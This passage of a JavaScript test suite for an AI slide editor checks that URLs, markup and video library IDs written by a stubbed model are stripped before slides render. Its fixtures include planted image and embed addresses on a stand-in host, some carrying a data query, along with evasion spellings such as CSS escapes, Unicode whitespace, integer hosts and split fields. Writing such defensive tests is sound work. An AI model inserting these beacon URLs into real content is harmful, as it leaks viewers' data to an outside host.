    `<p><a href="https://${HOST}/read">Read more</a></p><img src="/uploads/own.png" alt="">`;
  const slide = notesSlide({ body, photo: '/uploads/own.png' });
  dropForeignMedia([slide], { slideTypes: TYPES });
  assert.equal(slide.content.body, body);
  assert.equal(slide.content.photo, '/uploads/own.png');
  assert.equal(slide._aiWarnings, undefined);
  const html = renderSlideHtml(slide, { slideTypes: TYPES });
  assert.ok(html.includes(INSTALLATION_MARK), 'the template keeps its mark');
});

test("markup the slides held in that field stays; moved elsewhere it is the model's", () => {
  const shown = [notesSlide({ body: PLANTED_MARKUP })];
  const keep = heldInSlides(shown, TYPES);
  const handedBack = notesSlide({ body: PLANTED_MARKUP, title: 'Shorter' });
  dropForeignMedia([handedBack], { slideTypes: TYPES, keep });
  assert.equal(handedBack.content.body, PLANTED_MARKUP, 'a person wrote it');

  // The same text, written as prose on a core slide, renders as text there;
  // moved into the field that renders it as markup, it would load.
  const fromProse = heldInSlides(
    [{ type: 'content-slide', content: { title: 'x', body: PLANTED_MARKUP } }],
    TYPES,
  );
  const moved = notesSlide({ body: PLANTED_MARKUP });
  dropForeignMedia([moved], { slideTypes: TYPES, keep: fromProse });
  assert.equal(moved.content.body, '');
});

test('a value split over two texts is emptied until the slide loads nothing', () => {
  const split = toRuntimeSlideType({
    id: 'cst-split',
    slug: 'split',
    label: 'Split',
    fields: [
      { key: 'scheme', type: 'string', label: 'a' },
      { key: 'rest', type: 'string', label: 'b' },
      { key: 'title', type: 'string', label: 'c' },
    ],
    defaults: {},
    template:
      '<div class="slide"><h2>{{esc title}}</h2><img src="{{esc scheme}}{{esc rest}}" alt=""></div>',
  });
  const types = { ...TYPES, 'custom-split': split };
  const slide = {
    type: 'custom-split',
    content: { scheme: 'https:', rest: `//${HOST}/p.png?d=x`, title: 'Kept' },
  };
  dropForeignMedia([slide], { slideTypes: types });
  assert.equal(slide.content.title, 'Kept');
  assert.ok(
    !slide.content.scheme || !slide.content.rest,
    'one half of the address is gone',
  );
  assert.deepEqual(
    plantedLoads(renderSlideHtml(slide, { slideTypes: types })),
    [],
  );
});

test('a number the template writes into an address is judged like a text', () => {
  const host = toRuntimeSlideType({
    id: 'cst-host',
    slug: 'host',
    label: 'Host',
    fields: [{ key: 'n', type: 'number', label: 'n' }],
    defaults: {},
    template:
      '<div class="slide"><img src="https://{{esc n}}/p.png" alt=""></div>',
  });
  const types = { ...TYPES, 'custom-host': host };
  const slide = { type: 'custom-host', content: { n: 2130706433 } };
  dropForeignMedia([slide], { slideTypes: types });
  assert.equal(Object.hasOwn(slide.content, 'n'), false);
});

test('a render that throws empties every text the model wrote', () => {
  const broken = toRuntimeSlideType({
    id: 'cst-broken',
    slug: 'broken',
    label: 'Broken',
    fields: [{ key: 'title', type: 'string', label: 't' }],
    defaults: {},
    template: '<div class="slide">{{esc title}}</div>',
  });
  broken.renderHtml = () => {
    throw new Error('no');
  };
  const types = { ...TYPES, 'custom-broken': broken };
  const slide = { type: 'custom-broken', content: { title: PLANTED_MARKUP } };
  dropForeignMedia([slide], { slideTypes: types });
  assert.equal(slide.content.title, '');
});

test('the load reader counts what loads and nothing that does not', () => {
  const count = (html) =>
    [...loadSurfaces(html).values()].reduce((a, b) => a + b, 0);
  assert.equal(
    count('<img src="/own.png"><a href="https://x.example/">l</a>'),
    0,
  );
  assert.equal(
    count('<div style="width: calc(100% - 2rem); color: red">x</div>'),
    0,
  );
  assert.equal(
    count('<div style="background: linear-gradient(red, blue)">x</div>'),
    0,
  );
  assert.equal(count(`<img src="${IMAGE}">`), 1);
  assert.equal(
    count('<div style="background: url(/own.png)">x</div>'),
    1,
    'any url() counts',
  );
  assert.equal(
    count('<div style="x: \\75 rl(/own.png)">x</div>'),
    1,
    'an escape counts',
  );
  assert.equal(count(`<template><img src="${IMAGE}"></template>`), 1);
});

test("a field the type keeps from the model gets the installation's value back", () => {
  const configured = {
    ...TYPES,
    'video-slide': {
      ...TYPES['video-slide'],
      defaults: { ...TYPES['video-slide'].defaults, bunnyLibraryId: '424242' },
    },
  };
  const film = () => ({
    type: 'video-slide',
    content: {
      title: 'A film',
      source: 'a-bare-video-id',
      bunnyLibraryId: PLANTED_LIBRARY,
      transcript: 'An invented transcript.',
      watchUrl: `https://${HOST}/watch`,
    },
  });
  const slide = film();
  dropForeignMedia([slide], { slideTypes: configured });
  assert.equal(slide.content.bunnyLibraryId, '424242');
  assert.equal(slide.content.transcript, '');
  assert.equal(slide.content.watchUrl, '');
  assert.equal(slide.content.source, 'a-bare-video-id');
  assert.match(slide._aiWarnings.join(' '), /left to people/);

  // What the shown slide held there stays: a person chose it.
  const shown = film();
  const kept = film();
  dropForeignMedia([kept], {
    slideTypes: configured,
    keep: heldInSlides([shown], configured),
  });
  assert.equal(kept.content.bunnyLibraryId, PLANTED_LIBRARY);
  assert.equal(kept.content.transcript, 'An invented transcript.');
});

test('the rule asks for what heldInSlides gives', () => {
  assert.throws(
    () => dropForeignMedia([], { slideTypes: TYPES, keep: new Set() }),
    /heldInSlides/,
  );
});

// ── What the slide renders ──────────────────────────────────────────────────

/** A field the viewer's browser loads, as the rule reads the declaration. */
const isMediaField = (f) => f?.type === 'image' || Boolean(f?.mediaRef);

/** Every media field of a type, as a path: `['image']`, `['logos', 'image']`. */
function* mediaPaths(fields, prefix = []) {
  for (const field of fields) {
    if (isMediaField(field)) yield { path: [...prefix, field.key], field };
    else if (field.type === 'items')
      yield* mediaPaths(field.itemFields || [], [...prefix, field.key]);
  }
}

/** A new slide of `type` with `value` in the media field at `path`. */
function slideWith(type, path, value) {
  const slide = newSlide({ type, slideTypes: SLIDE_TYPES });
  const [key, itemKey] = path;
  if (!itemKey) {
    slide.content[key] = value;
    return slide;
  }
  if (!Array.isArray(slide.content[key]) || !slide.content[key].length)
    slide.content[key] = [{}];
  for (const item of slide.content[key]) item[itemKey] = value;
  return slide;
}

test('the render oracle reads what the browser reads', () => {
  // A comment opens no string, so the second address is still seen.
  assert.deepEqual(cssAddresses(`a:url(/x) /* ' */; b:url(//${HOST}/p)`), [
    '/x',
    `//${HOST}/p`,
  ]);
  // A backslash before a line feed outside a string ends; it does not hang.
  assert.deepEqual(cssAddresses(`\\\nb:url(//${HOST}/p)`), [`//${HOST}/p`]);
  // Only a srcset is a list: a tab in a src hides nothing.
  assert.deepEqual(
    plantedLoads(`<img src="/a\t//${HOST}/p"><img src="https:\t//${HOST}/p">`),
    [`https:\t//${HOST}/p`],
  );
  // A CSS address the parser refuses and that names the host counts as a load.
  assert.equal(cssLoadsPlantedHost(`https://${HOST}\uff1a/p`), true);
  assert.equal(resolvesToPlantedHost(`https://${HOST}\uff1a/p`), false);
});

/**
 * A field whose value as written loads nothing, with or without the rule. The
 * video player frames only YouTube, Vimeo and Bunny; which video an id names
 * is DY-863.
 */
const LOADS_NOTHING_AS_WRITTEN = new Set(['video-slide source']);

test('every media field of every type renders nothing a model planted, in any form', () => {
  let fields = 0;
  for (const [type, def] of Object.entries(SLIDE_TYPES)) {
    for (const { path, field } of mediaPaths(def.fields || [])) {
      fields += 1;
      const name = `${type} ${path.join('.')}`;
      const url = field.mediaRef ? EMBED : IMAGE;
      // The oracle sees the planted host when no rule runs.
      const bare = slideWith(type, path, url);
      const unguarded = plantedLoads(
        renderSlideHtml(migratePresentation({ slides: [bare] }).slides[0]),
      );
      assert.equal(
        unguarded.length > 0,
        !LOADS_NOTHING_AS_WRITTEN.has(name),
        `${name}: the render oracle does not see the planted host`,
      );
      for (const form of Object.keys(HOSTILE_FORMS)) {
        const value = hostile(form, url);
        // Unguarded, the render loads the planted host only where the value
        // the rule reads resolves to it: no sink repairs or re-decodes a
        // value, and none writes one the URL parser refuses.
        const loads = plantedLoads(
          renderSlideHtml(
            migratePresentation({ slides: [slideWith(type, path, value)] })
              .slides[0],
          ),
        );
        const used = mediaValue(value);
        assert.ok(
          !loads.length || (Boolean(used) && resolvesToPlantedHost(used)),
          `${name}, ${form}: the render loads ${loads} from a value the rule reads as local`,
        );
        const slide = slideWith(type, path, value);
        dropForeignMedia([slide], { slideTypes: SLIDE_TYPES });
        assertRendersNothingPlanted([slide], `${name}, ${form}`);
      }
    }
  }
  assert.ok(fields > 40, `only ${fields} media fields found`);
});

test('a media field with anything but a string is emptied, and a required one leaves its slide out', () => {
  const slides = [
    {
      type: 'team-cards-slide',
      content: { members: [{ name: 'Ann', image: ['/uploads/own.png'] }] },
    },
    { type: 'embed-slide', content: { embedUrl: { href: HELD_EMBED } } },
  ];
  const unusable = dropForeignMedia(slides, {
    slideTypes: SLIDE_TYPES,
    keep: heldInSlides(heldSlides(), SLIDE_TYPES),
  });
  assert.equal(slides[0].content.members[0].image, '');
  assert.equal(slides[1].content.embedUrl, '');
  assert.deepEqual([...unusable], [slides[1]]);
  assert.match(slides[0]._aiWarnings[0], /remote image/);
});

test('a held value is held in every spelling the slide uses it in', () => {
  const slides = [
    { type: 'image-slide', content: { image: `\u00a0${HELD_IMAGE}\u3000` } },
  ];
  dropForeignMedia(slides, {
    slideTypes: SLIDE_TYPES,
    keep: heldInSlides(heldSlides(), SLIDE_TYPES),
  });
  assert.equal(slides[0].content.image, `\u00a0${HELD_IMAGE}\u3000`);
});

/**
 * Every step of `SCHEMA_MIGRATIONS` that moves a key into a media field, with
 * one model answer per move. The rule folds before it judges, so each comes
 * back without the planted host however the funnel spells it. A step index is
 * the version it migrates from.
 */
const FOLDS_INTO_MEDIA = {
  // v7 -> v8: numbered slots into team-cards `members[]`, logo-wall `logos[]`.
  7: [
    {
      type: 'team-cards-slide',
      content: { members: [], card1Name: 'Ann', card1Image: IMAGE },
    },
    {
      type: 'logo-wall-slide',
      content: { logos: [], logo1Name: 'Acme', logo1Image: IMAGE },
    },
  ],
  // v14 -> v15: image-text's retired `images[]`, into its flat `image` or,
  // under a plural layout, into image-set's `images[].src`.
  14: [
    {
      type: 'image-text-slide',
      content: { title: 'One', images: [{ src: IMAGE }] },
    },
    {
      type: 'image-text-slide',
      content: { title: 'Two', layout: 'duo', images: [{ src: IMAGE }] },
    },
  ],
  // v16 -> v17: quote-slide's flat quote and an item's first portrait.
  16: [
    {
      type: 'quote-slide',
      content: { quote: 'Hi.', authorName: 'Ann', authorImage1: IMAGE },
    },
    {
      type: 'quote-slide',
      content: {
        quotes: [{ quote: 'Hi.', authorName: 'Ann', authorImage: IMAGE }],
      },
    },
  ],
  // v21 -> v22: the legacy `bgImage` into `slideBgImage`, on every type.
  21: [
    { type: 'content-slide', content: { title: 'Old', bgImage: IMAGE } },
    { type: 'image-slide', content: { title: 'Old', bgImage: BACKGROUND } },
  ],
};

test('a migration step that replaces a slide object stops the rule instead of passing it', (t) => {
  SCHEMA_MIGRATIONS.push((pres) => ({
    ...pres,
    slides: pres.slides.map((slide) => ({ ...slide })),
  }));
  t.after(() => SCHEMA_MIGRATIONS.pop());
  assert.throws(
    () =>
      dropForeignMedia([{ type: 'image-slide', content: { image: IMAGE } }], {
        slideTypes: SLIDE_TYPES,
      }),
    /replaced a slide object/,
  );
});

test('a legacy key the read funnel folds into a media field is judged after the fold', () => {
  assert.equal(
    SCHEMA_MIGRATIONS.length,
    24,
    'a new step: if it moves a key into a media field, give it a case in FOLDS_INTO_MEDIA; and it must edit slides in place, or foldAsRead throws',
  );
  for (const [step, answers] of Object.entries(FOLDS_INTO_MEDIA)) {
    for (const answer of answers) {
      const name = `v${step} -> v${Number(step) + 1}, ${answer.type}`;
      // Unguarded, the read moves the planted URL where the slide loads it.
      const bare = migratePresentation({ slides: [structuredClone(answer)] });
      assert.notDeepEqual(
        plantedLoads(renderSlideHtml(bare.slides[0])),
        [],
        `${name}: the funnel no longer moves this key into a media field`,
      );
      const slides = [structuredClone(answer)];
      dropForeignMedia(slides, { slideTypes: SLIDE_TYPES });
      assertNothingPlanted(slides, name);
      assertRendersNothingPlanted(slides, name);
    }
  }
});

// ── Every path that writes slide content ────────────────────────────────────

/** Phase 1 and phase 2 of generation, answered from one object. */
function generationAnswer(body) {
  const indexes = [...body.matchAll(/originalIndex: (\d+)\)/g)].map((m) =>
    Number(m[1]),
  );
  return {
    title: 'A report',
    summary: 'What happened',
    sections: [{ heading: 'The year', keyPoints: ['One', 'Two'] }],
    slides: planted()
      .map((slide, originalIndex) => ({
        ...slide,
        intent: 'content',
        section: 0,
        roughContent: slide.content.title,
        originalIndex,
      }))
      .filter(
        (slide) =>
          !body.includes('PRESENTATION CONTEXT') ||
          indexes.includes(slide.originalIndex),
      ),
  };
}

const appendAnswer = () => ({ rationale: 'Added.', slides: planted() });

test('generation: a new deck holds no URL the model wrote', async (t) => {
  await setup();
  stubModel(t, generationAnswer);
  const deck = await generateDeck('The year in four slides.', {
    lang: 'en-GB',
    slideTypes: TYPES,
    ...(await loadSlideTypeOffer(scope())),
  });
  assertPlantedTypes(deck.slides, 'generation');
  assertNothingPlanted(deck.slides, 'generation');
  assertRendersNothingPlanted(deck.slides, 'generation');
  assertLeftOutNotice(deck.slides, 'generation');
});

test('append, the editor: the answer holds no URL the model wrote', async (t) => {
  await setup();
  stubModel(t, appendAnswer);
  const { slides } = await callRoute(handleAiAppendSlides, {
    raw: 'Add four slides.',
    lang: 'en',
  });
  assertPlantedTypes(slides, 'editor append');
  assertNothingPlanted(slides, 'editor append');
  assertRendersNothingPlanted(slides, 'editor append');
  assertLeftOutNotice(slides, 'editor append');
});

/**
 * A planted slide with a list where its type declares a string (the embed,
 * a member's portrait): v1 checks the schema, items included (DY-862), and
 * refuses it before the rule runs.
 */
const breaksSchema = (s) =>
  Array.isArray(s.content?.embedUrl) ||
  (s.content?.members || []).some((m) => Array.isArray(m?.image));

test('append, public v1: the answer holds no URL the model wrote', async (t) => {
  await setup();
  // v1 refuses a slide that breaks its type's schema before the rule runs
  // (the next test); the rest of the planted set goes through the rule.
  stubModel(t, () => ({
    ...appendAnswer(),
    slides: planted().filter((s) => !breaksSchema(s)),
  }));
  const { slides } = await callV1('append-slides', {
    raw: 'Add four slides.',
    lang: 'en',
  });
  assertPlantedTypes(slides, 'v1 append');
  assertNothingPlanted(slides, 'v1 append');
  assertRendersNothingPlanted(slides, 'v1 append');
});

test('append, public v1: an embed that is not a string refuses the answer', async (t) => {
  await setup();
  stubModel(t, appendAnswer);
  t.mock.method(console, 'error', () => {});
  const answer = await callV1('append-slides', {
    raw: 'Add four slides.',
    lang: 'en',
  });
  assert.equal(answer.slides, undefined, 'nothing comes back');
  assertNothingPlanted(answer, 'v1 append, refused');
});

test('append, MCP: the stored deck holds no URL the model wrote', async (t) => {
  await setup();
  stubModel(t, appendAnswer);
  const answer = await callTool('append_slides', {
    presentationId: deckId,
    content: 'Add four slides.',
  });
  assert.equal(
    answer.appended,
    plantedThatStay().length,
    'the embeds and the videos are left out',
  );
  assertPlantedTypes(stored().slides, 'MCP append');
  assertNothingPlanted(stored(), 'MCP append');
  assertRendersNothingPlanted(stored().slides, 'MCP append');
  assert.ok(
    answer.warnings.some(({ message }) => /was left out/.test(message)),
    JSON.stringify(answer.warnings),
  );
});

test('append, MCP: an answer of only an embed stores nothing and says why', async (t) => {
  await setup();
  const [, , embed] = planted();
  stubModel(t, () => ({ rationale: 'Added.', slides: [embed] }));
  const answer = await callTool('append_slides', {
    presentationId: deckId,
    content: 'Embed the page.',
  });
  assert.equal(answer.appended, 0);
  assert.equal(stored().slides.length, 3);
  assert.match(answer.warnings[0].message, /was left out/);
});

test('refine-section: a revised section holds what the deck held, nothing new', async (t) => {
  const deck = await setup();
  stubModel(t, () => ({
    rationale: 'Revised.',
    slides: [
      ...planted(),
      {
        type: 'embed-slide',
        content: { title: 'Board', embedUrl: HELD_EMBED },
      },
    ],
  }));
  const { slides } = await callRoute(handleAiRefineSection, {
    presentation: deck,
    slideIds: [deck.slides[2].id],
    feedback: 'Make it visual.',
    lang: 'en',
  });
  assertPlantedTypes(slides, 'refine-section');
  assertNothingPlanted(slides, 'refine-section');
  assertRendersNothingPlanted(slides, 'refine-section');
  assert.equal(slides.at(-1).content.embedUrl, HELD_EMBED, 'the held embed');
});

test('refine-section: a section of only a planted embed is a failed answer', async (t) => {
  const deck = await setup();
  const [, , embed] = planted();
  stubModel(t, () => ({ rationale: 'Revised.', slides: [embed] }));
  t.mock.method(console, 'error', () => {});
  const res = createMockRes();
  await handleAiRefineSection({
    repoRoot: REPO_ROOT,
    storageScope: scope(),
    req: createMockReq({
      method: 'POST',
      body: {
        presentation: deck,
        slideIds: [deck.slides[2].id],
        feedback: 'Embed it.',
      },
    }),
    res,
    authedUser: AUTHED,
  });
  // An empty section would delete the selected slides in the editor.
  assert.equal(res.statusCode, 502);
  assert.equal(res.json().error, 'bad_gateway');
});

/** One planted background per form, and one under the legacy key. */
const plantedBackgrounds = () => [
  ...Object.keys(HOSTILE_FORMS).map((name) => [
    name,
    { slideBgImage: hostile(name, BACKGROUND) },
  ]),
  ['under the legacy key bgImage', { bgImage: IMAGE }],
];

test('iterate, one slide: the rewritten slide keeps its own image only', async (t) => {
  for (const [form, background] of plantedBackgrounds()) {
    await t.test(form, async (st) => {
      const deck = await setup();
      stubModel(st, () => ({
        type: 'image-text-slide',
        content: {
          title: 'The barn',
          body: 'Shorter.',
          image: HELD_IMAGE,
          ...background,
        },
      }));
      const answer = await callRoute(handleAiIterate, {
        presentation: deck,
        command: 'Make this shorter',
        currentSlideIndex: 0,
      });
      assertNothingPlanted(answer, `editor iterate, ${form}`);
      const [slide] = answer.presentation.slides;
      assert.equal(slide.content.body, 'Shorter.');
      assert.equal(slide.content.image, HELD_IMAGE, 'its own image stays');
      if (namesPlantedHost(background.slideBgImage ?? background.bgImage)) {
        assert.ok(
          !slide.content.slideBgImage,
          'the planted background is gone',
        );
      }
      assertRendersNothingPlanted([slide], `editor iterate, ${form}`);
    });
  }
});

test('iterate, one slide: a rewrite into markup or a library of its own loads neither', async (t) => {
  const answers = {
    markup: {
      type: NOTES_TYPE,
      content: { title: 'Notes', body: PLANTED_MARKUP, photo: IMAGE },
    },
    library: {
      type: 'video-slide',
      content: {
        title: 'A film',
        source: 'a-bare-video-id',
        bunnyLibraryId: PLANTED_LIBRARY,
      },
    },
  };
  for (const [name, answer] of Object.entries(answers)) {
    await t.test(name, async (st) => {
      const deck = await setup();
      stubModel(st, () => answer);
      const result = await callRoute(handleAiIterate, {
        presentation: deck,
        command: 'Make this different',
        currentSlideIndex: 2,
      });
      const slide = result.presentation.slides[2];
      assert.equal(slide.type, answer.type, 'the rewrite came back');
      assertNothingPlanted(result, `editor iterate, ${name}`);
      assertRendersNothingPlanted([slide], `editor iterate, ${name}`);
      assert.equal(slide.content.bunnyLibraryId || '', '');
    });
  }
});

test('iterate, one slide: an embed behind white space or in an array is a failed answer', async (t) => {
  for (const form of ['behind U+3000', 'in an array']) {
    await t.test(form, async (st) => {
      const deck = await setup();
      stubModel(st, () => ({
        type: 'embed-slide',
        content: { title: 'A page', embedUrl: hostile(form, EMBED) },
      }));
      st.mock.method(console, 'error', () => {});
      const res = createMockRes();
      await handleAiIterate({
        storageScope: scope(),
        req: createMockReq({
          method: 'POST',
          body: {
            presentation: deck,
            command: 'Make this an embed',
            currentSlideIndex: 2,
          },
        }),
        res,
        authedUser: AUTHED,
      });
      assert.equal(res.statusCode, 502);
    });
  }
});

test('iterate, one slide: a rewrite into a planted embed is a failed answer', async (t) => {
  const deck = await setup();
  const [, , embed] = planted();
  stubModel(t, () => embed);
  t.mock.method(console, 'error', () => {});
  const res = createMockRes();
  await handleAiIterate({
    storageScope: scope(),
    req: createMockReq({
      method: 'POST',
      body: {
        presentation: deck,
        command: 'Make this an embed',
        currentSlideIndex: 2,
      },
    }),
    res,
    authedUser: AUTHED,
  });
  assert.equal(res.statusCode, 502);
});

/** A deck-wide plan: one replacement and one split, both planted. */
const planAnswer = () => {
  const [image, gallery, embed, video] = planted();
  return {
    summary: 'Reworked.',
    modifications: [
      { slideIndex: 0, action: 'replace', slide: image, reasoning: 'r' },
      { slideIndex: 1, action: 'replace', slide: embed, reasoning: 'r' },
      {
        slideIndex: 2,
        action: 'split',
        slides: [gallery, video, ...planted().slice(4)],
      },
    ],
  };
};

test('iterate, deck-wide: no replacement or split holds a URL the model wrote', async (t) => {
  const deck = await setup();
  stubModel(t, planAnswer);
  const answer = await callRoute(handleAiIterate, {
    presentation: deck,
    command: 'More visual variety everywhere',
  });
  // The replacement by an embed is not in the plan: slide 2 stays as it was.
  assert.deepEqual(
    answer.plan.modifications.map((m) => m.slideIndex),
    [0, 2],
  );
  assert.match(answer.plan.summary, /was left out/);
  assert.equal(answer.presentation.slides[1].content.embedUrl, HELD_EMBED);
  assertPlantedTypes(answer.presentation.slides, 'deck-wide iterate');
  assertNothingPlanted(answer, 'deck-wide iterate');
  assertRendersNothingPlanted(answer.presentation.slides, 'deck-wide iterate');
});

test('iterate, MCP: neither the plan nor the stored deck holds one', async (t) => {
  await setup();
  stubModel(t, planAnswer);
  const proposed = await callTool('iterate_presentation', {
    presentationId: deckId,
    command: 'More visual variety everywhere',
  });
  assert.equal(proposed.applied, false);
  assertNothingPlanted(proposed, 'MCP iterate plan');

  const applied = await callTool('iterate_presentation', {
    presentationId: deckId,
    command: 'More visual variety everywhere',
    apply: [0, 1, 2],
  });
  assert.equal(applied.applied, true);
  assertPlantedTypes(stored().slides, 'MCP iterate');
  assertNothingPlanted(stored(), 'MCP iterate');
  assertRendersNothingPlanted(stored().slides, 'MCP iterate');
});

/** A conversion's content: the target type's fields plus a planted background. */
const convertAnswer = () => ({
  title: 'Plan',
  variant: 'bullets',
  items: [
    { title: 'Next year', text: 'Extend.' },
    { title: 'After that', text: 'Rest.' },
  ],
  slideBgImage: BACKGROUND,
});

test('convert-slide, the editor: the converted slide brings no background', async (t) => {
  for (const [form, background] of plantedBackgrounds()) {
    await t.test(form, async (st) => {
      const deck = await setup();
      const { slideBgImage: _planted, ...fields } = convertAnswer();
      stubModel(st, () => ({ ...fields, ...background }));
      const { slide } = await callRoute(handleAiConvertSlide, {
        slide: deck.slides[2],
        toType: 'list-slide',
        lang: 'en',
      });
      assert.equal(slide.type, 'list-slide');
      assertNothingPlanted(slide, `editor convert, ${form}`);
      assertRendersNothingPlanted([slide], `editor convert, ${form}`);
    });
  }
});

test('convert-slide keeps the background the slide already had', async (t) => {
  await setup();
  stubModel(t, () => ({ ...convertAnswer(), slideBgImage: HELD_IMAGE }));
  const { slide } = await callRoute(handleAiConvertSlide, {
    slide: {
      type: 'content-slide',
      content: { title: 'Plan', body: 'Next.', slideBgImage: HELD_IMAGE },
    },
    toType: 'list-slide',
    lang: 'en',
  });
  assert.equal(slide.content.slideBgImage, HELD_IMAGE);
});

test('convert-slide, MCP: the stored slide brings no background', async (t) => {
  for (const [form, background] of plantedBackgrounds()) {
    await t.test(form, async (st) => {
      await setup();
      const { slideBgImage: _planted, ...fields } = convertAnswer();
      stubModel(st, () => ({ ...fields, ...background }));
      await callTool('convert_slide', {
        presentationId: deckId,
        slideIndex: 2,
        targetType: 'list-slide',
      });
      assert.equal(stored().slides[2].type, 'list-slide');
      assertNothingPlanted(stored(), `MCP convert, ${form}`);
      assertRendersNothingPlanted(stored().slides, `MCP convert, ${form}`);
    });
  }
});

test('analysis: a proposed slide holds what the deck held, nothing new', async (t) => {
  const deck = await setup();
  const [image, , embed] = planted();
  stubModel(t, () => ({
    suggestions: [
      {
        slideId: deck.slides[0].id,
        category: 'visual-balance',
        body: 'Use a picture.',
        proposedSlide: image,
      },
      {
        slideId: deck.slides[1].id,
        category: 'slide-type',
        body: 'Embed it.',
        proposedSlide: embed,
      },
      {
        slideId: deck.slides[2].id,
        category: 'slide-type',
        body: 'Show the board here.',
        proposedSlide: {
          type: 'embed-slide',
          content: { title: 'Board', embedUrl: HELD_EMBED },
        },
      },
      ...planted()
        .slice(4)
        .map((proposedSlide) => ({
          slideId: deck.slides[2].id,
          category: 'visual-balance',
          body: 'Another picture.',
          proposedSlide,
        })),
    ],
  }));
  const { suggestions } = await analyzePresentation(deck, {
    vendor: 'openai',
    slideTypes: TYPES,
    ...(await loadSlideTypeOffer(scope())),
  });
  const notes = suggestions.find((s) => s.proposedSlide?.type === NOTES_TYPE);
  assert.ok(notes, 'the proposal of a type from the database stays');
  assert.equal(notes.proposedSlide.content.body, '', 'its markup is gone');
  assert.equal(
    suggestions.length,
    3 + planted().length - 4,
    'the advice stays',
  );
  assert.equal(suggestions[0].proposedSlide.content.image, '');
  assert.equal(suggestions[1].proposedSlide, null, 'no embed without a page');
  assertNothingPlanted(suggestions, 'analysis');
  assert.equal(suggestions[2].proposedSlide.content.embedUrl, HELD_EMBED);
  assertRendersNothingPlanted(
    suggestions.map((s) => s.proposedSlide).filter(Boolean),
    'analysis',
  );
});

// ── The list is closed ──────────────────────────────────────────────────────

/** Files that call the transport and turn the answer into slide content. */
const WRITES_SLIDE_CONTENT = {
  'server/utils/ai/generate-outline.js': 'generation',
  'server/utils/ai/revise-outline.js': 'generation',
  'server/utils/ai/refine-slides.js': 'generation',
  'server/utils/openai/append.js': 'append',
  'server/utils/ai/refine-section.js': 'refine-section',
  'server/utils/ai/iterate-deck.js': 'iterate',
  'server/utils/openai/convert-slide.js': 'convert-slide',
  'server/utils/ai/analyze-presentation.js': 'analysis',
};

/** Files whose answer never becomes a media field, and why. */
const WRITES_NO_MEDIA = {
  'server/utils/ai/compress-deck.js': 'indexes and reasons, no slide content',
  'server/utils/ai/compare-versions.js': 'insights about slides, returned',
  'server/utils/openai/translate.js': 'strings for declared text keys only',
  'server/utils/llm/alt-text.js': 'alt text, previewed',
  'server/services/digest-generation.js': 'email fields',
  'server/routes/api/presentations/description.js': 'a description, returned',
};

function callSiteFiles(dir = path.join(REPO_ROOT, 'server')) {
  return readdirSync(dir, { withFileTypes: true }).flatMap((entry) => {
    const file = path.join(dir, entry.name);
    if (entry.isDirectory()) return callSiteFiles(file);
    if (!entry.name.endsWith('.js')) return [];
    // On the import, not on a call: a call without `await`, or one passed on
    // as a value, still reaches the model.
    const source = readFileSync(file, 'utf8');
    const calls =
      /\bimport\s*\{[^}]*\brequestChatCompletionContent\b[^}]*\}\s*from/.test(
        source,
      ) || /\.requestChatCompletionContent\b/.test(source);
    return calls ? [path.relative(REPO_ROOT, file)] : [];
  });
}

test('a new call to the model cannot write slide content unseen here', (t) => {
  assert.deepEqual(
    callSiteFiles().sort(),
    [
      ...Object.keys(WRITES_SLIDE_CONTENT),
      ...Object.keys(WRITES_NO_MEDIA),
    ].sort(),
    'file the new call under WRITES_SLIDE_CONTENT, with a test, or WRITES_NO_MEDIA',
  );
  const tested = readFileSync(fileURLToPath(import.meta.url), 'utf8');
  for (const name of new Set(Object.values(WRITES_SLIDE_CONTENT))) {
    assert.match(tested, new RegExp(`^test\\('${name}[,:]`, 'm'), name);
  }
  t.diagnostic(`${Object.keys(WRITES_SLIDE_CONTENT).length} writing files`);
});
